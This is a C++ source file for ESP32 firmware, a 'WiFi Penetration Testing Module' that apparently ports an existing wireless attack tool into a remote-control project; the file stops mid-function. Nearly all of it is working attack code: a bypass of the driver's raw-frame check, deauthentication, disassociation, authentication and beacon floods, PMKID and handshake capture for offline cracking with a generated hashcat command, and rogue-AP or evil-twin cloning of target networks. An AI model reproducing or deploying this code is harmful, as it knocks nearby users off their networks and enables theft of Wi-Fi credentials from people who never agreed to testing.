// ============================================================
//  wifi_pen_module.cpp  —  WiFi Penetration Testing Module v4.0
//  Full port of esp32-wifi-penetration-tool into IR Remote GUI
// ============================================================
#include "wifi_pen_module.h"
#include "sd_manager.h"
#include "wifi_manager.h"   // wifiMgr for restoring mgmt AP credentials after rogue stop
#include <WiFi.h>
#include <LittleFS.h>
#include <ArduinoJson.h>

#define TAG "[WPEN]"
#define PCAP_MAX (48 * 1024)  // 48 KB cap

WifiPenModule wifiPen;

// ── WSL Bypasser ─────────────────────────────────────────────
// Overrides the sanity-check function in the closed Wi-Fi stack
// allowing raw 802.11 frame injection via esp_wifi_80211_tx().
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

// Deauth frame template (broadcast, reason=2 invalid auth)
static const uint8_t DEAUTH_TEMPLATE[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // DA  (broadcast / target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA  (filled with BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSS (filled with BSSID)
    0xf0, 0xff, 0x02, 0x00              // seq + reason 2
};

// Disassociation frame template (reason=8)
static const uint8_t DISASSOC_TEMPLATE[] = {
    0xa0, 0x00, 0x3a, 0x01,              // FC: type=0 mgmt, subtype=0xa (disassoc)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSS (BSSID)
    0xf0, 0xff, 0x08, 0x00               // seq + reason 8
};

// Beacon frame template for flood attack
static const uint8_t BEACON_TEMPLATE[] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x31, 0x04,
    0x00, 0x00
};
#define BEACON_HDR_SSID_TAG_OFFSET  36
#define BEACON_SA_OFFSET            10
#define BEACON_BSSID_OFFSET         16

// ── Attack profiles ──────────────────────────────────────────
static const WpenProfile PROFILES[] = {
    {"Stealth",    WpenAttackType::PMKID,         WpenMethod::PASSIVE,   60,  2},
    {"Aggressive", WpenAttackType::HANDSHAKE,     WpenMethod::BROADCAST, 30, 20},
    {"Recon",      WpenAttackType::PROBE_SNIFFER, WpenMethod::PASSIVE,  120,  5},
};
static const uint8_t PROFILES_COUNT = sizeof(PROFILES) / sizeof(PROFILES[0]);

// ── OUI lookup table ─────────────────────────────────────────
struct OuiEntry { uint8_t oui[3]; const char* name; };

static const OuiEntry OUI_TABLE[] = {
    {{0xf4, 0xf1, 0x5a}, "Apple"},
    {{0xd0, 0x03, 0x4b}, "Apple"},
    {{0x3c, 0x06, 0x30}, "Apple"},
    {{0x8c, 0x71, 0xf8}, "Samsung"},
    {{0x00, 0x07, 0xab}, "Samsung"},
    {{0x24, 0x6f, 0x28}, "Espressif"},
    {{0xa4, 0xcf, 0x12}, "Espressif"},
    {{0x30, 0xae, 0xa4}, "Espressif"},
    {{0xdc, 0xa6, 0x32}, "RaspberryPi"},
    {{0xb8, 0x27, 0xeb}, "RaspberryPi"},
    {{0x00, 0x1b, 0x21}, "Intel"},
    {{0x8c, 0x8d, 0x28}, "Intel"},
    {{0x50, 0xc7, 0xbf}, "TP-Link"},
    {{0xac, 0x84, 0xc6}, "TP-Link"},
    {{0x28, 0x6c, 0x07}, "Xiaomi"},
    {{0x34, 0xce, 0x00}, "Xiaomi"},
    {{0x54, 0x60, 0x09}, "Google"},
    {{0xf4, 0xf5, 0xe8}, "Google"},
};
static const uint8_t OUI_TABLE_SIZE = sizeof(OUI_TABLE) / sizeof(OUI_TABLE[0]);

// ── Static callbacks ─────────────────────────────────────────
void WifiPenModule::_cbPromiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Always dispatch MGMT frames (needed for WPS probing even when idle)
    if (type == WIFI_PKT_MGMT) {
        wifiPen._rxFrame(buf, type);
        return;
    }
    if (type == WIFI_PKT_DATA)
        wifiPen._rxFrame(buf, type);
}
void WifiPenModule::_cbDeauth(void* arg) {
    WifiPenModule* self = (WifiPenModule*)arg;
    self->_sendDeauthFrame();
}
void WifiPenModule::_cbHop(void* arg) {
    static uint8_t ch = 1;
    ch = (ch % 13) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}
void WifiPenModule::_cbBeacon(void* arg) {
    WifiPenModule* self = (WifiPenModule*)arg;
    char ssid[13];
    uint32_t r = (uint32_t)esp_timer_get_time();
    snprintf(ssid, sizeof(ssid), "FLOOD_%06lX", (unsigned long)(r & 0xFFFFFF));
    uint8_t ssidLen = (uint8_t)strlen(ssid);

    uint8_t fakeMac[6];
    uint32_t r2 = (uint32_t)(esp_timer_get_time() >> 8);
    fakeMac[0] = 0x02;
    fakeMac[1] = (r2 >> 16) & 0xFF;
    fakeMac[2] = (r2 >>  8) & 0xFF;
    fakeMac[3] = (r2      ) & 0xFF;
    fakeMac[4] = (r       ) & 0xFF;
    fakeMac[5] = (r  >>  4) & 0xFF;

    size_t frameLen = sizeof(BEACON_TEMPLATE) + ssidLen + 3;
    uint8_t* frame = (uint8_t*)malloc(frameLen);
    if (!frame) return;
    memcpy(frame, BEACON_TEMPLATE, sizeof(BEACON_TEMPLATE));
    memcpy(frame + BEACON_SA_OFFSET,    fakeMac, 6);
    memcpy(frame + BEACON_BSSID_OFFSET, fakeMac, 6);
    frame[BEACON_HDR_SSID_TAG_OFFSET]     = 0x00;
    frame[BEACON_HDR_SSID_TAG_OFFSET + 1] = ssidLen;
    memcpy(frame + BEACON_HDR_SSID_TAG_OFFSET + 2, ssid, ssidLen);
    uint8_t* ds = frame + BEACON_HDR_SSID_TAG_OFFSET + 2 + ssidLen;
    ds[0] = 0x03; ds[1] = 0x01; ds[2] = 6;
    esp_wifi_80211_tx(WIFI_IF_AP, frame, frameLen, false);
    free(frame);
}

void WifiPenModule::_cbAuthFlood(void* arg) {
    WifiPenModule* self = (WifiPenModule*)arg;
    if (self->_tIdx >= self->_apCount) return;

    // Build Authentication frame: subtype=0x0B, algo=0 OpenSystem, seq=1, status=0
    // FC(2) + Duration(2) + DA(6) + SA(6) + BSSID(6) + SeqCtrl(2) + AuthAlgo(2) + AuthSeq(2) + StatusCode(2) = 30 bytes
    uint8_t frame[30];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0xb0; frame[1] = 0x00;  // FC: mgmt, subtype=0x0B auth
    frame[2] = 0x3a; frame[3] = 0x01;  // Duration
    // DA = target AP BSSID
    memcpy(&frame[4],  self->_aps[self->_tIdx].bssid, 6);
    // SA = random locally-administered MAC
    uint32_t r  = (uint32_t)esp_timer_get_time();
    uint32_t r2 = r ^ (r >> 13);
    frame[10] = 0x02;
    frame[11] = (r2 >> 16) & 0xFF;
    frame[12] = (r2 >>  8) & 0xFF;
    frame[13] = (r2      ) & 0xFF;
    frame[14] = (r        ) & 0xFF;
    frame[15] = (r  >>  5) & 0xFF;
    // BSSID = target AP BSSID
    memcpy(&frame[16], self->_aps[self->_tIdx].bssid, 6);
    // SeqCtrl
    frame[22] = 0x00; frame[23] = 0x00;
    // Auth Algo = 0 (Open System)
    frame[24] = 0x00; frame[25] = 0x00;
    // Auth Seq = 1
    frame[26] = 0x01; frame[27] = 0x00;
    // Status = 0
    frame[28] = 0x00; frame[29] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

void WifiPenModule::_cbDisassoc(void* arg) {
    WifiPenModule* self = (WifiPenModule*)arg;
    if (self->_tIdx >= self->_apCount) return;
    uint8_t frame[sizeof(DISASSOC_TEMPLATE)];
    memcpy(frame, DISASSOC_TEMPLATE, sizeof(frame));
    memcpy(&frame[10], self->_aps[self->_tIdx].bssid, 6);  // SA = BSSID
    memcpy(&frame[16], self->_aps[self->_tIdx].bssid, 6);  // BSS = BSSID
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

// ── begin / loop ─────────────────────────────────────────────
void WifiPenModule::begin() {
    esp_wifi_get_mac(WIFI_IF_AP, _origMac);
    memset(&_hccapx, 0, sizeof(_hccapx));
    _hccapx.signature    = 0x58504348;
    _hccapx.version      = 4;
    _hccapx.message_pair = 255;
    _hccapx.keyver       = 2;
    memset(_replayRing, 0, sizeof(_replayRing));
    _replayRingIdx = 0;
    memset(_rssiHist, 0, sizeof(_rssiHist));
    _logEvent("Module ready");
}

void WifiPenModule::loop() {
    if (_state != WpenState::RUNNING) return;
    if (_tOutMs > 0 && (millis() - _tStart) >= _tOutMs) {
        _logEvent("Timeout reached");
        stopAttack();
        _state = WpenState::TIMEOUT;
    }

    // Feature 31: auto attack log flush to SD
    if (_autoLogFlush && sdMgr.isAvailable() &&
        (millis() - _lastLogFlushMs) > 30000UL) {
        flushAttackLogToSD();
        _lastLogFlushMs = millis();
    }
}

void WifiPenModule::setEnabled(bool en) {
    _enabled = en;
    if (!en) stopAttack();
    _logEvent("%s", en ? "enabled" : "disabled");
}

// ── OUI lookup ───────────────────────────────────────────────
const char* WifiPenModule::ouiLookup(const uint8_t* mac) {
    for (uint8_t i = 0; i < OUI_TABLE_SIZE; i++) {
        if (mac[0] == OUI_TABLE[i].oui[0] &&
            mac[1] == OUI_TABLE[i].oui[1] &&
            mac[2] == OUI_TABLE[i].oui[2]) {
            return OUI_TABLE[i].name;
        }
    }
    return "Unknown";
}

// ── Attack log ────────────────────────────────────────────────
void WifiPenModule::_logEvent(const char* fmt, ...) {
    char buf[80];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    Serial.printf(TAG " %s\n", buf);

    uint8_t slot = (_attackLogHead + _attackLogLen) % 64;
    strncpy(_attackLog[slot], buf, 79);
    _attackLog[slot][79] = '\0';
    if (_attackLogLen < 64) {
        _attackLogLen++;
    } else {
        _attackLogHead = (_attackLogHead + 1) % 64;
    }
}

String WifiPenModule::attackLogJson() const {
    String out = "[";
    for (uint8_t i = 0; i < _attackLogLen; i++) {
        uint8_t slot = (_attackLogHead + i) % 64;
        if (i) out += ',';
        out += '"';
        for (const char* c = _attackLog[slot]; *c; c++) {
            if (*c == '"')       { out += "\\\""; }
            else if (*c == '\\') { out += "\\\\"; }
            else                 { out += *c; }
        }
        out += '"';
    }
    return out + "]";
}

// ── RSSI history push ─────────────────────────────────────────
void WifiPenModule::_rssiPush(uint8_t apSlot, int8_t rssi) {
    if (apSlot >= 20) return;
    RssiHistory& hist = _rssiHist[apSlot];
    hist.samples[hist.head] = rssi;
    hist.head = (hist.head + 1) % 8;
    if (hist.len < 8) hist.len++;
}

// ── AP Scan ───────────────────────────────────────────────────
bool WifiPenModule::scan() {
    if (_state == WpenState::RUNNING) {
        _logEvent("Scan blocked — attack running");
        return false;
    }
    _apCount = 0;
    _logEvent("Scanning...");
    WiFi.scanDelete();
    int n = WiFi.scanNetworks(false, true);
    if (n < 0) n = 0;
    _apCount = (uint8_t)min(n, 20);
    for (uint8_t i = 0; i < _apCount; i++) {
        memset(&_aps[i], 0, sizeof(WpenAP));
        strncpy(_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
        // Arduino-ESP32 2.x: WiFi.BSSID(i) returns uint8_t* into an internal buffer.
        // Copy 6 bytes out into our struct.
        {
            uint8_t* bssidPtr = WiFi.BSSID(i);
            if (bssidPtr) memcpy(_aps[i].bssid, bssidPtr, 6);
        }
        _aps[i].rssi     = (int8_t)WiFi.RSSI(i);
        _aps[i].channel  = (uint8_t)WiFi.channel(i);
        _aps[i].authmode = (uint8_t)WiFi.encryptionType(i);
        _aps[i].wps      = false;
        // Push current RSSI into history
        _rssiPush(i, _aps[i].rssi);
    }
    _logEvent("Found %u APs", _apCount);

    if (_autoChannelLock && _apCount > 0) {
        uint8_t bestIdx  = 0;
        int8_t  bestRssi = _aps[0].rssi;
        for (uint8_t i = 1; i < _apCount; i++) {
            if (_aps[i].rssi > bestRssi) {
                bestRssi = _aps[i].rssi;
                bestIdx  = i;
            }
        }
        _lockedChannel = _aps[bestIdx].channel;
        _logEvent("AutoChLock: ch%u (AP '%s' rssi=%d)",
                  _lockedChannel, _aps[bestIdx].ssid, bestRssi);
    }
    return true;
}

const WpenAP* WifiPenModule::getAP(uint8_t i) const {
    return (i < _apCount) ? &_aps[i] : nullptr;
}

String WifiPenModule::apListJson() const {
    String out = "[";
    for (uint8_t i = 0; i < _apCount; i++) {
        if (i) out += ',';
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _aps[i].bssid[0],_aps[i].bssid[1],_aps[i].bssid[2],
            _aps[i].bssid[3],_aps[i].bssid[4],_aps[i].bssid[5]);
        const char* oui = ouiLookup(_aps[i].bssid);
        out += "{\"idx\":"    + String(i)
             + ",\"ssid\":\"" + String(_aps[i].ssid) + "\""
             + ",\"bssid\":\"" + String(b) + "\""
             + ",\"rssi\":"   + String(_aps[i].rssi)
             + ",\"ch\":"     + String(_aps[i].channel)
             + ",\"enc\":"    + String(_aps[i].authmode)
             + ",\"oui\":\""  + String(oui) + "\""
             + ",\"wps\":"    + String(_aps[i].wps ? "true" : "false")
             + "}";
    }
    return out + "]";
}

// ── CSV export of AP scan ────────────────────────────────────
String WifiPenModule::apListCsv() const {
    String out = "idx,ssid,bssid,rssi,channel,enc,oui,wps\n";
    for (uint8_t i = 0; i < _apCount; i++) {
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _aps[i].bssid[0],_aps[i].bssid[1],_aps[i].bssid[2],
            _aps[i].bssid[3],_aps[i].bssid[4],_aps[i].bssid[5]);
        const char* oui = ouiLookup(_aps[i].bssid);
        out += String(i) + ","
             + "\"" + String(_aps[i].ssid) + "\","
             + String(b) + ","
             + String(_aps[i].rssi) + ","
             + String(_aps[i].channel) + ","
             + String(_aps[i].authmode) + ","
             + String(oui) + ","
             + String(_aps[i].wps ? "1" : "0") + "\n";
    }
    return out;
}

// ── Auto channel lock setter ──────────────────────────────────
void WifiPenModule::setAutoChannelLock(bool en) {
    _autoChannelLock = en;
    _logEvent("AutoChLock %s", en ? "enabled" : "disabled");
}

// ── Target client (directed deauth) ──────────────────────────
void WifiPenModule::setTargetClient(const uint8_t* mac) {
    memcpy(_targetClient, mac, 6);
    _hasTargetClient = true;
    _logEvent("TargetClient set %02x:%02x:%02x:%02x:%02x:%02x",
              mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void WifiPenModule::clearTargetClient() {
    memset(_targetClient, 0, 6);
    _hasTargetClient = false;
    _logEvent("TargetClient cleared");
}

// ── Client list helpers ───────────────────────────────────────
void WifiPenModule::_addClient(const uint8_t* mac) {
    if (mac[0] & 0x01) return;
    for (uint8_t i = 0; i < _clientCount; i++) {
        if (memcmp(_clients[i].mac, mac, 6) == 0) return;
    }
    if (_clientCount < 16) {
        memcpy(_clients[_clientCount].mac, mac, 6);
        _clientCount++;
        _logEvent("Client: %02x:%02x:%02x:%02x:%02x:%02x",
                  mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    }
}

String WifiPenModule::clientListJson() const {
    String out = "[";
    for (uint8_t i = 0; i < _clientCount; i++) {
        if (i) out += ',';
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _clients[i].mac[0],_clients[i].mac[1],_clients[i].mac[2],
            _clients[i].mac[3],_clients[i].mac[4],_clients[i].mac[5]);
        const char* oui = ouiLookup(_clients[i].mac);
        out += "{\"mac\":\"" + String(b) + "\",\"oui\":\"" + String(oui) + "\"}";
    }
    return out + "]";
}

// ── Probe sniffer helpers ─────────────────────────────────────
void WifiPenModule::_addProbe(const uint8_t* mac, const char* ssid, int8_t rssi) {
    if (mac[0] & 0x01) return;
    for (uint8_t i = 0; i < _probeCount; i++) {
        if (memcmp(_probes[i].mac, mac, 6) == 0 &&
            strncmp(_probes[i].ssid, ssid, 32) == 0) {
            _probes[i].rssi = rssi;
            return;
        }
    }
    if (_probeCount < 32) {
        memcpy(_probes[_probeCount].mac, mac, 6);
        strncpy(_probes[_probeCount].ssid, ssid, 32);
        _probes[_probeCount].ssid[32] = '\0';
        _probes[_probeCount].rssi = rssi;
        _probeCount++;
    }
}

String WifiPenModule::probeListJson() const {
    String out = "[";
    for (uint8_t i = 0; i < _probeCount; i++) {
        if (i) out += ',';
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _probes[i].mac[0],_probes[i].mac[1],_probes[i].mac[2],
            _probes[i].mac[3],_probes[i].mac[4],_probes[i].mac[5]);
        const char* oui = ouiLookup(_probes[i].mac);
        out += "{\"mac\":\"" + String(b) + "\""
             + ",\"ssid\":\"" + String(_probes[i].ssid) + "\""
             + ",\"rssi\":"   + String(_probes[i].rssi)
             + ",\"oui\":\""  + String(oui) + "\"}";
    }
    return out + "]";
}

// ── Hashcat command generator ─────────────────────────────────
String WifiPenModule::hashcatCmd() const {
    if (_pmkidHead)
        return "hashcat -m 22000 pmkid.txt wordlist.txt";
    if (_hccapx.message_pair != 255)
        return "hashcat -m 22000 capture.hccapx wordlist.txt";
    return "";
}

// ── Multi-target ─────────────────────────────────────────────
void WifiPenModule::setMultiTargets(const uint8_t* idxList, uint8_t count) {
    _targetIdxCount = (count > 8) ? 8 : count;
    memcpy(_targetIdxList, idxList, _targetIdxCount);
    _multiTarget = (_targetIdxCount > 0);
    _logEvent("MultiTarget: %u targets", _targetIdxCount);
}

// ── WPA2/WPA3 auto-detect ────────────────────────────────────
WpenAttackType WifiPenModule::autoDetectAttackType(uint8_t apIdx) {
    if (apIdx >= _apCount) return WpenAttackType::HANDSHAKE;
    uint8_t auth = _aps[apIdx].authmode;
    if (auth == 6 || auth == 7) {
        // WPA3_PSK or WPA2_WPA3_PSK — SAE, use handshake capture
        return WpenAttackType::HANDSHAKE;
    }
    if (auth == 3 || auth == 4) {
        // WPA2_PSK or WPA_WPA2_PSK — PMKID works
        return WpenAttackType::PMKID;
    }
    return WpenAttackType::HANDSHAKE;
}

// ── Rate-limited deauth ──────────────────────────────────────
void WifiPenModule::setDeauthRate(uint8_t pps) {
    if (pps == 0) pps = 1;
    _deauthPps = pps;
    uint32_t periodUs = 1000000UL / pps;
    if (_deauthTimer) {
        esp_timer_stop(_deauthTimer);
        esp_timer_start_periodic(_deauthTimer, periodUs);
        _logEvent("DeauthRate updated to %u pps", pps);
    }
}

// ── Attack profiles ──────────────────────────────────────────
bool WifiPenModule::applyProfile(uint8_t profileIdx, uint8_t apIdx) {
    if (profileIdx >= PROFILES_COUNT) {
        _logEvent("applyProfile: invalid idx %u", profileIdx);
        return false;
    }
    const WpenProfile& p = PROFILES[profileIdx];
    setDeauthRate(p.deauthPps);
    _logEvent("applyProfile: '%s'", p.name);
    return startAttack(p.type, p.method, apIdx, p.timeoutSec);
}

String WifiPenModule::profileListJson() const {
    String out = "[";
    for (uint8_t i = 0; i < PROFILES_COUNT; i++) {
        if (i) out += ',';
        out += "{\"idx\":"       + String(i)
             + ",\"name\":\""    + String(PROFILES[i].name) + "\""
             + ",\"type\":"      + String((uint8_t)PROFILES[i].type)
             + ",\"method\":"    + String((uint8_t)PROFILES[i].method)
             + ",\"timeoutSec\":" + String(PROFILES[i].timeoutSec)
             + ",\"deauthPps\":" + String(PROFILES[i].deauthPps)
             + "}";
    }
    return out + "]";
}

// ── Attack start ─────────────────────────────────────────────
bool WifiPenModule::startAttack(WpenAttackType t, WpenMethod m,
                                uint8_t apIdx, uint8_t timeoutSec)
{
    if (!_enabled)           { _logEvent("disabled"); return false; }
    if (_state == WpenState::RUNNING) { _logEvent("busy");    return false; }
    if (apIdx >= _apCount && t != WpenAttackType::BEACON_FLOOD
                          && t != WpenAttackType::PROBE_SNIFFER) {
        _logEvent("bad AP idx"); return false;
    }

    resetAttack();
    _atype   = t;
    _method  = m;
    _tIdx    = apIdx;
    _tOutMs  = (uint32_t)timeoutSec * 1000UL;
    _tStart  = millis();
    _state   = WpenState::RUNNING;
    _frameCount = 0;

    uint8_t ch = (apIdx < _apCount) ? _aps[apIdx].channel : 6;
    if (_autoChannelLock && _lockedChannel > 0) ch = _lockedChannel;

    _logEvent("START type=%u method=%u ap='%s' ch=%u to=%us",
        (uint8_t)t, (uint8_t)m,
        (apIdx < _apCount ? _aps[apIdx].ssid : "N/A"),
        ch, timeoutSec);

    switch (t) {
        case WpenAttackType::PMKID:
            _pcapInit();
            _hccapxInit(_aps[apIdx].ssid, strlen(_aps[apIdx].ssid));
            _snifferStart(ch);
            WiFi.disconnect(false);
            delay(80);
            // Disambiguate begin() overload set in arduino-esp32 2.x by casting
            // arguments to a single overload's signature (const char* / int32_t).
            // Without this, the compiler can't pick between the char* and
            // const char* overloads.
            WiFi.begin(static_cast<const char*>(_aps[apIdx].ssid),
                       "triggerpmkid",
                       static_cast<int32_t>(ch));
            break;

        case WpenAttackType::HANDSHAKE:
            _pcapInit();
            _hccapxInit(_aps[apIdx].ssid, strlen(_aps[apIdx].ssid));
            _snifferStart(ch);
            if (m == WpenMethod::BROADCAST) {
                _deauthTimerStart(1000000UL / _deauthPps);
            } else if (m == WpenMethod::ROGUE_AP) {
                _rogueStart(apIdx);
            } else if (m == WpenMethod::PASSIVE) {
                setHop(true);
            } else if (m == WpenMethod::EVIL_TWIN) {
                _rogueStart(apIdx);
                _captiveStart();
            }
            break;

        case WpenAttackType::DOS:
            _snifferStart(ch);
            if (m == WpenMethod::BROADCAST) {
                _deauthTimerStart(1000000UL / _deauthPps);
            } else if (m == WpenMethod::ROGUE_AP) {
                _rogueStart(apIdx);
            } else if (m == WpenMethod::COMBINE) {
                _rogueStart(apIdx);
                _deauthTimerStart(1000000UL / _deauthPps);
            } else if (m == WpenMethod::EVIL_TWIN) {
                _rogueStart(apIdx);
                _captiveStart();
            }
            break;

        case WpenAttackType::BEACON_FLOOD:
            _beaconFloodStart();
            break;

        case WpenAttackType::PROBE_SNIFFER:
            _probeCount = 0;
            _snifferStart(ch);
            break;

        case WpenAttackType::AUTH_FLOOD:
            _snifferStart(ch);
            _authFloodStart();
            break;

        case WpenAttackType::DISASSOC_FLOOD:
            _snifferStart(ch);
            _disassocTimerStart(500000UL);
            break;

        default:
            _state = WpenState::IDLE;
            return false;
    }
    return true;
}

void WifiPenModule::stopAttack() {
    if (_state != WpenState::RUNNING) return;
    _deauthTimerStop();
    _beaconFloodStop();
    _snifferStop();
    _rogueStop();
    _hopStop();
    _authFloodStop();
    _disassocTimerStop();
    _captiveStop();
    WiFi.disconnect(false);
    if (_state == WpenState::RUNNING)
        _state = WpenState::FINISHED;
    _logEvent("Stopped — pcap=%u bytes  hccapx_pair=%u  pmkids=%s",
        (unsigned)_pcapSz,
        (unsigned)_hccapx.message_pair,
        _pmkidHead ? "yes" : "none");
}

void WifiPenModule::resetAttack() {
    stopAttack();
    _pcapFree();
    _pmkidFreeList();
    memset(&_hccapx, 0, sizeof(_hccapx));
    _hccapx.signature    = 0x58504348;
    _hccapx.version      = 4;
    _hccapx.message_pair = 255;
    _hccapx.keyver       = 2;
    _msgAP = _msgSTA = _eapolSrc = 0;
    _saeFrameCount = 0;
    _clientCount   = 0;
    _frameCount    = 0;
    _vendorIECount = 0;
    _multiTarget   = false;
    _targetIdxCount= 0;
    _targetTsf     = 0;
    memset(_replayRing, 0, sizeof(_replayRing));
    _replayRingIdx = 0;
    _state = WpenState::IDLE;
    _atype = WpenAttackType::PASSIVE;
}

// ── Sniffer ───────────────────────────────────────────────────
void WifiPenModule::_snifferStart(uint8_t ch) {
    uint8_t actualCh = (_autoChannelLock && _lockedChannel > 0) ? _lockedChannel : ch;
    esp_wifi_deauth_sta(0);
    esp_wifi_set_channel(actualCh, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t f = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_cbPromiscuous);
    _sniff = true;
    _logEvent("Sniffer on ch%u", actualCh);
}

void WifiPenModule::_snifferStop() {
    if (!_sniff) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _sniff = false;
    _logEvent("Sniffer stopped");
}

// ── WSL Bypasser / Deauth ─────────────────────────────────────
void WifiPenModule::_sendDeauthFrame() {
    if (!_sniff) return;

    if (_multiTarget) {
        // Send one deauth per target in the list
        for (uint8_t t = 0; t < _targetIdxCount; t++) {
            uint8_t idx = _targetIdxList[t];
            if (idx >= _apCount) continue;
            uint8_t frame[sizeof(DEAUTH_TEMPLATE)];
            memcpy(frame, DEAUTH_TEMPLATE, sizeof(frame));
            memcpy(&frame[10], _aps[idx].bssid, 6);
            memcpy(&frame[16], _aps[idx].bssid, 6);
            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        }
        return;
    }

    if (_tIdx >= _apCount) return;
    uint8_t frame[sizeof(DEAUTH_TEMPLATE)];
    memcpy(frame, DEAUTH_TEMPLATE, sizeof(frame));

    if (_hasTargetClient) {
        memcpy(&frame[4],  _targetClient,     6);
        memcpy(&frame[10], _aps[_tIdx].bssid, 6);
        memcpy(&frame[16], _aps[_tIdx].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);

        memcpy(&frame[4],  _aps[_tIdx].bssid, 6);
        memcpy(&frame[10], _targetClient,     6);
        memcpy(&frame[16], _aps[_tIdx].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    } else {
        memcpy(&frame[10], _aps[_tIdx].bssid, 6);
        memcpy(&frame[16], _aps[_tIdx].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    }
}

void WifiPenModule::_deauthTimerStart(uint32_t periodUs) {
    if (_deauthTimer) return;
    const esp_timer_create_args_t args = {
        .callback = &_cbDeauth,
        .arg      = this,
        .name     = "wpen_deauth"
    };
    esp_timer_create(&args, &_deauthTimer);
    esp_timer_start_periodic(_deauthTimer, periodUs);
    _logEvent("Deauth timer started (%lu us)", (unsigned long)periodUs);
}

void WifiPenModule::_deauthTimerStop() {
    if (!_deauthTimer) return;
    esp_timer_stop(_deauthTimer);
    esp_timer_delete(_deauthTimer);
    _deauthTimer = nullptr;
}

// ── Auth flood ────────────────────────────────────────────────
void WifiPenModule::_authFloodStart() {
    if (_authFloodTimer) return;
    const esp_timer_create_args_t args = {
        .callback = &_cbAuthFlood,
        .arg      = this,
        .name     = "wpen_authflood"
    };
    esp_timer_create(&args, &_authFloodTimer);
    esp_timer_start_periodic(_authFloodTimer, 50000UL);  // 50ms
    _logEvent("Auth flood started");
}

void WifiPenModule::_authFloodStop() {
    if (!_authFloodTimer) return;
    esp_timer_stop(_authFloodTimer);
    esp_timer_delete(_authFloodTimer);
    _authFloodTimer = nullptr;
    _logEvent("Auth flood stopped");
}

// ── Disassoc flood ────────────────────────────────────────────
void WifiPenModule::_disassocTimerStart(uint32_t periodUs) {
    if (_disassocTimer) return;
    const esp_timer_create_args_t args = {
        .callback = &_cbDisassoc,
        .arg      = this,
        .name     = "wpen_disassoc"
    };
    esp_timer_create(&args, &_disassocTimer);
    esp_timer_start_periodic(_disassocTimer, periodUs);
    _logEvent("Disassoc flood started");
}

void WifiPenModule::_disassocTimerStop() {
    if (!_disassocTimer) return;
    esp_timer_stop(_disassocTimer);
    esp_timer_delete(_disassocTimer);
    _disassocTimer = nullptr;
    _logEvent("Disassoc flood stopped");
}

// ── Beacon flood ──────────────────────────────────────────────
void WifiPenModule::_beaconFloodStart() {
    if (_beaconTimer) return;
    const esp_timer_create_args_t args = {
        .callback = &_cbBeacon,
        .arg      = this,
        .name     = "wpen_beacon"
    };
    esp_timer_create(&args, &_beaconTimer);
    esp_timer_start_periodic(_beaconTimer, 100000UL);
    _logEvent("Beacon flood started");
}

void WifiPenModule::_beaconFloodStop() {
    if (!_beaconTimer) return;
    esp_timer_stop(_beaconTimer);
    esp_timer_delete(_beaconTimer);
    _beaconTimer = nullptr;
    _logEvent("Beacon flood stopped");
}

// ── Rogue AP ──────────────────────────────────────────────────
void WifiPenModule::_rogueStart(uint8_t idx) {
    if (_rogueActive) return;
    esp_wifi_get_mac(WIFI_IF_AP, _origMac);
    esp_wifi_set_mac(WIFI_IF_AP, _aps[idx].bssid);
    wifi_config_t cfg = {};
    memcpy(cfg.ap.ssid, _aps[idx].ssid, 32);
    cfg.ap.ssid_len      = strlen(_aps[idx].ssid);
    cfg.ap.channel       = _aps[idx].channel;
    cfg.ap.authmode      = WIFI_AUTH_OPEN;
    cfg.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &cfg);
    _rogueActive = true;
    _logEvent("Rogue AP cloning '%s'", _aps[idx].ssid);
}

void WifiPenModule::_rogueStop() {
    if (!_rogueActive) return;
    esp_wifi_set_mac(WIFI_IF_AP, _origMac);
    // Arduino-ESP32 2.x removed WiFi.softAPPSK(); restore the management AP
    // by looking up our own config instead of asking the WiFi driver for the
    // current password (which it no longer surfaces).
    const auto& wc = wifiMgr.config();
    WiFi.softAP(wc.apSSID.c_str(), wc.apPass.c_str());
    _rogueActive = false;
